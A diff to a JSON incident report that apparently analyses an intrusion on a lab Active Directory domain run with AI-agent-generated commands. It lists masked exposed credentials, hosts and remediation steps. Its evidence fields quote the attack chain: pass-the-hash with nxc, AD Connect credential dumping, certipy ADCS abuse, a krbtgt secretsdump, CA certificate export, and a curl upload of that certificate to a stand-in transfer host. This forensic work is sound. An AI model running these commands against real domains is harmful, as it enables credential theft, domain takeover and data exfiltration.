@@ -7,7 +7,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "scripts",
@@ -17,7 +19,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "outputs",
@@ -27,7 +31,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators",
@@ -37,7 +43,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators Domain",
@@ -47,7 +55,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators Email",
@@ -57,7 +67,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators IPv4",
@@ -67,7 +79,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators MD5",
@@ -77,7 +91,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators SHA1",
@@ -87,7 +103,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "indicators URL",
@@ -97,7 +115,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities",
@@ -107,7 +127,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities CertificateExport",
@@ -117,7 +139,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "activities FileUpload",
@@ -127,7 +151,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "tactics",
@@ -137,7 +163,81 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed",
+    "section": "summary",
+    "value": 25,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed password",
+    "section": "summary",
+    "value": 6,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed username",
+    "section": "summary",
+    "value": 7,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed email",
+    "section": "summary",
+    "value": 2,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed device",
+    "section": "summary",
+    "value": 6,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "exposed ip",
+    "section": "summary",
+    "value": 4,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20250301_101800_step02_enum.sh",
@@ -147,7 +247,9 @@
     "basis": null,
     "files": "20250301_101845_step02_enum.log, 20250301_101910_step02_users.tsv",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20250301_102300_step03_adsync.sh",
@@ -157,7 +259,9 @@
     "basis": null,
     "files": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20250301_103200_step05_certs.sh",
@@ -167,7 +271,9 @@
     "basis": null,
     "files": "20250301_103240_certipy_find.txt, 20250301_103300_notes.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20250301_104000_step06_auth.sh",
@@ -177,7 +283,9 @@
     "basis": null,
     "files": "20250301_104010_step06_auth.txt, 20250301_104030_ca_store.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "20250301_104500_step07_exfil.sh",
@@ -187,17 +295,321 @@
     "basis": null,
     "files": null,
     "attack": "T1048, T1649",
-    "atlas": "AML.T0025"
+    "atlas": "AML.T0025",
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "88********c (32 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: hash of administrator@corp.example, collected",
+    "basis": null,
+    "files": "20250301_104010_step06_auth.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Qw********9 (25 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: password of MSOL_0a1b2c3d4e5f, collected",
+    "basis": null,
+    "files": "adsync_1740824865.txt:8, 20250301_103200_step05_certs.sh:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Zx********s (21 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com, collected",
+    "basis": null,
+    "files": "adsync_1740824865.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "88********c (32 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: hash of administrator, used",
+    "basis": null,
+    "files": "20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3, 20250301_104000_step06_auth.sh:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Qw********9 (25 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: password of MSOL_0a1b2c3d4e5f@corp.example, used",
+    "basis": null,
+    "files": "20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Wi********! (11 chars)",
+    "section": "exposure",
+    "value": "high",
+    "detail": "password: password of svc_backup, used",
+    "basis": null,
+    "files": "20250301_101800_step02_enum.sh:5, 20250301_101800_step02_enum.sh:8, 20250301_101845_step02_enum.log:1, 20250301_101845_step02_enum.log:2, 20250301_102300_step03_adsync.sh:7",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "MSOL_0a1b2c3d4e5f",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "20250301_101910_step02_users.tsv:2, adsync_1740824865.txt:7, 20250301_103200_step05_certs.sh:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "adsync_1740824865.txt:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "administrator@corp.example",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "20250301_104010_step06_auth.txt:1, 20250301_104010_step06_auth.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "svc_adsync",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: collected",
+    "basis": null,
+    "files": "20250301_101910_step02_users.tsv:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "MSOL_0a1b2c3d4e5f@corp.example",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: used",
+    "basis": null,
+    "files": "20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "administrator",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: used",
+    "basis": null,
+    "files": "20250301_104000_step06_auth.sh:3, 20250301_104000_step06_auth.sh:4, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "svc_backup",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "username: used",
+    "basis": null,
+    "files": "20250301_101800_step02_enum.sh:4, 20250301_101800_step02_enum.sh:8, 20250301_101845_step02_enum.log:1, 20250301_101845_step02_enum.log:2, 20250301_101845_step02_enum.log:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "email: collected",
+    "basis": null,
+    "files": "adsync_1740824865.txt:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "administrator@corp.example",
+    "section": "exposure",
+    "value": "medium",
+    "detail": "email: used",
+    "basis": null,
+    "files": "20250301_103200_step05_certs.sh:6, 20250301_103240_certipy_find.txt:12, 20250301_104010_step06_auth.txt:1",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "AADC01",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "20250301_101845_step02_enum.log:2, 20250301_101910_step02_users.tsv:2, 20250301_101910_step02_users.tsv:3, adsync_1740824625.txt:1, adsync_1740824625.txt:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "CA01",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "20250301_101845_step02_enum.log:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "DC01",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "20250301_101845_step02_enum.log:1",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "aadc01.corp.example",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "20250301_101530_step01_recon.txt:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "ca01.corp.example",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "20250301_101530_step01_recon.txt:6, 20250301_103200_step05_certs.sh:2, 20250301_103240_certipy_find.txt:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "dc01.corp.example",
+    "section": "exposure",
+    "value": "low",
+    "detail": "device: collected",
+    "basis": null,
+    "files": "20250301_101530_step01_recon.txt:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "10.20.1.17",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: collected",
+    "basis": null,
+    "files": "20250301_101530_step01_recon.txt:4, 20250301_101800_step02_enum.sh:6, 20250301_101845_step02_enum.log:2, 20250301_102300_step03_adsync.sh:3, adsync_1740824625.txt:1",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "10.20.1.23",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: collected",
+    "basis": null,
+    "files": "20250301_101530_step01_recon.txt:6, 20250301_101800_step02_enum.sh:6, 20250301_101845_step02_enum.log:3, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "10.20.1.5",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: collected",
+    "basis": null,
+    "files": "20250301_101530_step01_recon.txt:2, 20250301_101800_step02_enum.sh:2, 20250301_101845_step02_enum.log:1, 20250301_103200_step05_certs.sh:5, 20250301_104000_step06_auth.sh:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "10.20.1.0/24",
+    "section": "exposure",
+    "value": "low",
+    "detail": "ip: used",
+    "basis": null,
+    "files": "20250301_101500_step01_recon.sh:3",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "Credentials exposed",
     "section": "impact",
     "value": "high",
     "detail": "Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.",
-    "basis": "CertificateExport, CredentialAccess tools",
-    "files": "20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
+    "basis": "CertificateExport, CredentialAccess tools, exposed password",
+    "files": "20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104010_step06_auth.txt, 20250301_104500_step07_exfil.sh, adsync_1740824865.txt",
     "attack": "T1649",
-    "atlas": null
+    "atlas": null,
+    "targets": "file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup",
+    "evidence": "CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)\nnxc: nxc smb \"$h\" -u \"$USER\" -p \"$PASS\" -d $DOMAIN --shares (20250301_101800_step02_enum.sh:8)\nnxc: nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > \"$OUTFILE\" 2>&1 (20250301_102300_step03_adsync.sh:7)\nadconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)\ncertipy: certipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout (20250301_103200_step05_certs.sh:5)\ncertipy: certipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)\nsecretsdump.py: secretsdump.py -just-dc-user krbtgt -hashes :88********c (32 chars) corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)\nnxc: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)"
   },
   {
     "item": "Data may have left the environment",
@@ -207,7 +619,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": "AML.T0025"
+    "atlas": "AML.T0025",
+    "targets": "url https://transfer.example.net/upload; file 20250301_104100_ca_backup.p12",
+    "evidence": "FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)"
   },
   {
     "item": "Commands generated by an AI agent",
@@ -217,27 +631,33 @@
     "basis": "the premise of the tool",
     "files": "20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh, 20250301_102700_step03_adsync_v2.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
     "attack": null,
-    "atlas": "AML.T0102"
+    "atlas": "AML.T0102",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "Environment mapped",
     "section": "impact",
     "value": "low",
     "detail": "Identities, resources or configuration were listed. Later steps were probably aimed with the result.",
-    "basis": "Discovery tools",
-    "files": "20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh",
+    "basis": "Discovery tools, exposed username, exposed email, exposed device, exposed ip",
+    "files": "20250301_101500_step01_recon.sh, 20250301_101530_step01_recon.txt, 20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_101910_step02_users.tsv, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_103240_certipy_find.txt, 20250301_104000_step06_auth.sh, 20250301_104010_step06_auth.txt, 20250301_104500_step07_exfil.sh, adsync_1740824625.txt, adsync_1740824865.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "username MSOL_0a1b2c3d4e5f; username Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; username administrator@corp.example; username svc_adsync; email Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; device AADC01; device CA01; device DC01; device aadc01.corp.example; device ca01.corp.example; device dc01.corp.example; ip 10.20.1.17; ip 10.20.1.23; ip 10.20.1.5",
+    "evidence": "nmap: nmap -sn \"$TARGET_NET\" -oN \"$OUT\" (20250301_101500_step01_recon.sh:5)\nldapsearch: ldapsearch -x -H ldap://$DC_IP -D \"$USER@$DOMAIN\" -w \"$PASS\" -b \"DC=corp,DC=example\" \"(sAMAccountName=MSOL_*)\" sAMAccountName > 20250301_101910_step02_users.tsv (20250301_101800_step02_enum.sh:10)"
   },
   {
     "item": "Rotate what was read",
     "section": "remediation",
     "value": "high",
     "detail": "Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.",
-    "basis": "CertificateExport, CredentialAccess tools",
-    "files": "20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
+    "basis": "CertificateExport, CredentialAccess tools, exposed password",
+    "files": "20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104010_step06_auth.txt, 20250301_104500_step07_exfil.sh, adsync_1740824865.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup",
+    "evidence": "CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)\nnxc: nxc smb \"$h\" -u \"$USER\" -p \"$PASS\" -d $DOMAIN --shares (20250301_101800_step02_enum.sh:8)\nnxc: nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > \"$OUTFILE\" 2>&1 (20250301_102300_step03_adsync.sh:7)\nadconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)\ncertipy: certipy find -u \"$MSOL_USER@corp.example\" -p \"$MSOL_PASS\" -dc-ip 10.20.1.5 -vulnerable -stdout (20250301_103200_step05_certs.sh:5)\ncertipy: certipy auth -pfx \"$PFX\" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)\nsecretsdump.py: secretsdump.py -just-dc-user krbtgt -hashes :88********c (32 chars) corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)\nnxc: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -store My\" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)"
   },
   {
     "item": "Block and hunt the infrastructure",
@@ -247,7 +667,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "url https://transfer.example.net/upload; file 20250301_104100_ca_backup.p12",
+    "evidence": "FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)"
   },
   {
     "item": "Scope the data taken",
@@ -257,17 +679,21 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "url https://transfer.example.net/upload; file 20250301_104100_ca_backup.p12",
+    "evidence": "FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)"
   },
   {
     "item": "Follow what was enumerated",
     "section": "remediation",
     "value": "low",
     "detail": "Use what was listed to predict targets: check those identities, vaults and hosts for later activity.",
-    "basis": "Discovery tools",
-    "files": "20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh",
+    "basis": "Discovery tools, exposed username, exposed email, exposed device, exposed ip",
+    "files": "20250301_101500_step01_recon.sh, 20250301_101530_step01_recon.txt, 20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_101910_step02_users.tsv, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_103240_certipy_find.txt, 20250301_104000_step06_auth.sh, 20250301_104010_step06_auth.txt, 20250301_104500_step07_exfil.sh, adsync_1740824625.txt, adsync_1740824865.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "username MSOL_0a1b2c3d4e5f; username Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; username administrator@corp.example; username svc_adsync; email Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; device AADC01; device CA01; device DC01; device aadc01.corp.example; device ca01.corp.example; device dc01.corp.example; ip 10.20.1.17; ip 10.20.1.23; ip 10.20.1.5",
+    "evidence": "nmap: nmap -sn \"$TARGET_NET\" -oN \"$OUT\" (20250301_101500_step01_recon.sh:5)\nldapsearch: ldapsearch -x -H ldap://$DC_IP -D \"$USER@$DOMAIN\" -w \"$PASS\" -b \"DC=corp,DC=example\" \"(sAMAccountName=MSOL_*)\" sAMAccountName > 20250301_101910_step02_users.tsv (20250301_101800_step02_enum.sh:10)"
   },
   {
     "item": "M1015 Active Directory Configuration",
@@ -277,7 +703,9 @@
     "basis": "CertificateExport",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1649",
-    "atlas": null
+    "atlas": null,
+    "targets": "CertificateExport: file ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1018 User Account Management",
@@ -287,7 +715,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1022 Restrict File and Directory Permissions",
@@ -297,7 +727,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1030 Network Segmentation",
@@ -307,7 +739,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1031 Network Intrusion Prevention",
@@ -317,7 +751,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1037 Filter Network Traffic",
@@ -327,7 +763,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1041 Encrypt Sensitive Information",
@@ -337,7 +775,9 @@
     "basis": "CertificateExport",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1649",
-    "atlas": null
+    "atlas": null,
+    "targets": "CertificateExport: file ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1042 Disable or Remove Feature or Program",
@@ -347,7 +787,9 @@
     "basis": "CertificateExport",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1649",
-    "atlas": null
+    "atlas": null,
+    "targets": "CertificateExport: file ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1047 Audit",
@@ -357,7 +799,9 @@
     "basis": "CertificateExport",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1649",
-    "atlas": null
+    "atlas": null,
+    "targets": "CertificateExport: file ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "M1057 Data Loss Prevention",
@@ -367,7 +811,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "AML.M0005 Control Access to AI Models and Data at Rest",
@@ -377,7 +823,9 @@
     "basis": "FileUpload",
     "files": "20250301_104500_step07_exfil.sh",
     "attack": null,
-    "atlas": "AML.T0025"
+    "atlas": "AML.T0025",
+    "targets": "FileUpload: url https://transfer.example.net/upload, file 20250301_104100_ca_backup.p12",
+    "evidence": null
   },
   {
     "item": "AML.M0020 Generative AI Guardrails",
@@ -387,7 +835,9 @@
     "basis": "Commands generated by an AI agent",
     "files": "20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh, 20250301_102700_step03_adsync_v2.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
     "attack": null,
-    "atlas": "AML.T0102"
+    "atlas": "AML.T0102",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "AML.M0022 Generative AI Model Alignment",
@@ -397,6 +847,8 @@
     "basis": "Commands generated by an AI agent",
     "files": "20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh, 20250301_102700_step03_adsync_v2.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
     "attack": null,
-    "atlas": "AML.T0102"
+    "atlas": "AML.T0102",
+    "targets": null,
+    "evidence": null
   }
 ]
